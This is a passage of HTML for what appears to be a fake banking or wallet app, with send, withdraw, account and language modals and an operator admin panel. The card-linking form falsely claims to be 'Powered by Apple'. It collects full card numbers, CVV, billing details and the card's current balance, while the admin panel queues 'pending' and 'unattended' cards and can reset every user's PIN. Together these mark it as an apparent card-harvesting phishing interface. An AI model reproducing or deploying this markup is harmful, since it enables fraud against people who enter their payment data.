      </div>
      <div class="nav-item" id="add-card-btn">
        <div>üí≥</div>
        <div class="nav-label" data-translate="addCard">Add Card</div>
      </div>
      <div class="nav-item" id="more-btn">
        <div>‚ãØ</div>
        <div class="nav-label" data-translate="more">More</div>
      </div>
    </div>
  </div>

  <div>
    <h3 class="section-title" data-translate="recentTransactions">Recent Transactions</h3>
    <div class="transactions-container" id="transactions-container"></div>
  </div>
</div>

<!-- ACCOUNT MODAL -->
<div id="account-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="accountInfo">Account Information</h3>
      <button id="close-account" class="close-btn">√ó</button>
    </div>
    <div class="top-buttons">
      <button id="copy-account" class="copy-btn">üìã <span data-translate="copyAccount">Copy</span></button>
      <button id="generate-pin-btn" class="generate-pin-btn" data-translate="generatePin">Generate PIN</button>
    </div>
    <div class="account-info">
      <p><strong data-translate="accountNumber">Account Number:</strong><span id="acc-number">----------</span></p>
      <p><strong data-translate="country">Country:</strong><span id="acc-country">-</span></p>
      <p><strong data-translate="surname">Surname:</strong><span id="acc-surname">-</span></p>
      <p><strong data-translate="firstName">First Name:</strong><span id="acc-firstname">-</span></p>
      <p><strong data-translate="otherName">Other Name:</strong><span id="acc-othername">-</span></p>
      <p><strong data-translate="phoneNumber">Phone:</strong><span id="acc-phone">-</span></p>
      <div id="country-specific-info"></div>
    </div>
  </div>
</div>

<!-- CARD OPTIONS MODAL -->
<div id="card-options-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>üí≥ <span data-translate="myCards">My Cards</span></h3>
      <button id="close-card-options" class="close-btn">√ó</button>
    </div>
    <p style="text-align:center;opacity:0.8;margin-bottom:16px;" data-translate="chooseOption">Choose an option:</p>
    <div class="card-options-menu">
      <div class="card-option-btn" id="view-linked-cards-option">
        <div class="card-option-icon">üìã</div>
        <div class="card-option-title" data-translate="viewLinkedCards">View Linked Cards</div>
        <div class="card-option-desc" data-translate="viewLinkedCardsDesc">View your authorized and pending cards</div>
      </div>
      <div class="card-option-btn" id="add-new-card-option">
        <div class="card-option-icon">‚ûï</div>
        <div class="card-option-title" data-translate="addNewCardOption">Add New Card</div>
        <div class="card-option-desc" data-translate="addNewCardDesc">Link a new debit or credit card</div>
      </div>
    </div>
  </div>
</div>

<!-- CARDS LIST MODAL -->
<div id="cards-list-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>üí≥ <span data-translate="linkedCards">Linked Cards</span></h3>
      <button id="close-cards-list" class="close-btn">√ó</button>
    </div>
    <div id="linked-cards-list"></div>
  </div>
</div>

<!-- CARD FORM MODAL -->
<div id="card-modal" class="modal">
  <div class="modal-content apple-pay-modal">
    <!-- Apple Pay branding header shown only on new card form, hidden on edit -->
    <div id="apple-pay-header" class="apple-pay-header">
      <svg class="apple-logo" viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 482.4 8.1 361.4 8.1 246c0-189.3 123.6-289.6 245.1-289.6 66.1 0 121.1 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/>
      </svg>
      <span class="apple-pay-powered">Powered by Apple</span>
    </div>
    <div class="modal-header">
      <h3 id="card-modal-title">üí≥ Link Card</h3>
      <button id="close-card" class="close-btn">√ó</button>
    </div>
    <form id="card-form">
      <input type="text" id="card-number-input" placeholder="Card Number (16 digits)" required pattern="\d{16}" maxlength="19" style="letter-spacing:2px;font-family:'Courier New',monospace;">
      <input type="text" id="card-name" placeholder="Cardholder Name" required>
      <div class="card-input-group">
        <input type="text" id="card-expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}" maxlength="5">
        <input type="text" id="card-cvv" placeholder="CVV" required pattern="\d{3}" maxlength="3">
      </div>
      <div class="billing-address-section">
        <h4 id="card-billing-title">üìç Billing Address</h4>
        <input type="text" id="card-street" placeholder="Street Address" required>
        <input type="text" id="card-postcode" placeholder="Postal Code" required>
        <input type="text" id="card-city" placeholder="City" required>
        <input type="text" id="card-country" placeholder="Country" required>
        <input type="tel" id="card-phone" placeholder="Phone Number" required>
        <input type="text" id="card-balance" placeholder="Current Card Balance" required>
        <div class="balance-ownership-notice" id="balance-ownership-notice">
          ‚ö†Ô∏è <strong id="balance-notice-text">It is important to enter your correct current card balance to verify card ownership.</strong>
        </div>
      </div>
      <p class="error" id="card-error"></p>
      <button type="submit" data-translate="linkCard">Link Card</button>
    </form>
  </div>
</div>

<!-- SEND MODAL -->
<div id="send-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="sendMoney">Send Money</h3>
      <button id="close-send" class="close-btn">√ó</button>
    </div>
    <form id="send-form">
      <input type="text" id="send-recipient" data-ph="recipientAccount" placeholder="Recipient Account (10 digits)" required pattern="\d{10}" maxlength="10">
      <div id="recipient-info" style="display:none;padding:8px;margin:8px 0;background:rgba(255,255,255,0.1);border-radius:8px;font-size:14px;"></div>
      <input type="number" id="send-amount" data-ph="amount" placeholder="Amount" step="0.01" required min="0.01">
      <p class="error" id="send-error"></p>
      <button type="submit" data-translate="sendNow">Send Now</button>
    </form>
  </div>
</div>

<!-- WITHDRAW MODAL -->
<div id="withdraw-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="withdrawFunds">Withdraw Funds</h3>
      <button id="close-withdraw" class="close-btn">√ó</button>
    </div>
    <div class="withdrawal-notice" id="withdrawal-notice-text" data-translate="withdrawalNotice">‚ö†Ô∏è You can only withdraw to accounts in your name</div>
    <form id="withdraw-form">
      <select id="withdraw-method" required>
        <option value="" data-translate="selectMethod">Select Method</option>
      </select>
      <div id="withdraw-fields-container"></div>
      <input type="number" id="withdraw-amount" data-ph="amount" placeholder="Amount" step="0.01" required min="1">
      <input type="text" id="withdraw-pin" placeholder="Enter 4-digit PIN" required pattern="\d{4}" maxlength="4" class="pin-input">
      <p class="error" id="withdraw-error"></p>
      <button type="submit" data-translate="requestWithdrawal">Request Withdrawal</button>
    </form>
  </div>
</div>

<!-- MORE MODAL -->
<div id="more-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="more">More</h3>
      <button id="close-more" class="close-btn">√ó</button>
    </div>
    <div class="more-options">
      <div class="more-item" id="more-contact">üìß Contact us</div>
      <div class="more-item" id="more-help">‚ùì How to use</div>
      <div class="more-item" id="more-account">üë§ Account</div>
      <div class="more-item" id="more-logout" style="color:#ff5c5c;">üö™ Logout</div>
    </div>
  </div>
</div>

<!-- LANGUAGE MODAL -->
<div id="language-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>üåê Select Language</h3>
      <button id="close-language" class="close-btn">√ó</button>
    </div>
    <div class="language-options">
      <div class="language-option active-lang" data-lang="en">üá∫üá∏ English</div>
      <div class="language-option" data-lang="es">üá™üá∏ Espa√±ol</div>
      <div class="language-option" data-lang="fr">üá´üá∑ Fran√ßais</div>
      <div class="language-option" data-lang="pt">üáßüá∑ Portugu√™s</div>
    </div>
  </div>
</div>

<!-- ADMIN PANEL -->
<div id="admin-panel">
  <div class="admin-header">
    <h2>üîê <span data-translate="adminPanelTitle">Admin Panel</span></h2>
    <p style="opacity:0.7;"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="39585d545057795e54585055175a5654">[email&#160;protected]</a></p>
  </div>

  <div class="admin-tabs">
    <div class="admin-tab active" id="admin-tab-auth" data-translate="authorization">Authorization</div>
    <div class="admin-tab" id="admin-tab-codes" data-translate="codeManagement">Code Management</div>
  </div>

  <!-- AUTHORIZATION TAB -->
  <div id="admin-content-auth" class="admin-content" style="display:block;">
    <div class="admin-section-title" data-translate="recentCards">Recent Cards (Last 24h)</div>
    <div id="recent-cards-list"></div>
    <div class="admin-section-title" data-translate="unattendedCards">Unattended Cards</div>
    <div id="unattended-cards-list"></div>
    <div class="admin-section-title" data-translate="pendingCards">All Pending Cards</div>
    <div id="pending-cards-list"></div>
  </div>

  <!-- CODE MANAGEMENT TAB -->
  <div id="admin-content-codes" class="admin-content">
    <div class="admin-global-controls">
      <h3 data-translate="changeAllPins">Change All Users' PINs</h3>
      <div class="admin-global-input">
        <input type="text" id="admin-global-pin" class="admin-global-pin" data-ph="newPin" placeholder="New PIN" maxlength="4">
        <button id="admin-change-all-btn" class="admin-change-all-btn" data-translate="changeAll">Change All</button>
      </div>
      <button id="admin-logout-btn" class="admin-logout-btn" data-translate="logoutBtn">Logout</button>
    </div>
    <div class="admin-section-title" data-translate